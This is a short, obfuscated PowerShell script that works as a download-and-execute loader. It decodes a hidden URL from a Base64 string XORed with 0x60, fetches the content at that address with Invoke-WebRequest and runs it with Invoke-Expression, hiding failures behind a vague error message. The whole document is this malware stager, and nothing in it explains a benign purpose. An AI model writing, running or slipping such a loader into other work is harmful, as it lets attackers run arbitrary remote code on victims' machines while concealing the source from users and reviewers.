${7e849043} = "CBQUEBNaT08MCVFTVFVYUlVRU1hOBwkUCBUCTgkPTxNPVVJUWFEGVFMBWAJWBVdVAgZTVgYBUllRBVBQWQNQAlJXUVdVWFUDBVBTVQIGWVYCBVdTWVRQVFlYUFdQVlJSBg=="

${global:a3b2c1} = { 
    param(
        [string]${input_data},
        [int]${transform_value} = 0x60
    )
    
    ${base64_decoded_bytes} = [Convert]::FromBase64String(${input_data})
    ${utf8_decoded_string} = [System.Text.Encoding]::UTF8.GetString(${base64_decoded_bytes})
    
    ${processed_byte_array} = @()
    foreach (${byte_element} in [System.Text.Encoding]::UTF8.GetBytes(${utf8_decoded_string})) {
        ${processed_byte_array} += ${byte_element} -bxor ${transform_value}
    }
    
    return [System.Text.Encoding]::UTF8.GetString(${processed_byte_array})
}

${execution_context} = & ${global:a3b2c1} -input_data ${7e849043}

try {
    ${web_request_result} = Invoke-WebRequest -Uri ${execution_context}
    ${expression_result} = Invoke-Expression ${web_request_result}.Content
} catch {
    Write-Error "Failed Parse code"
}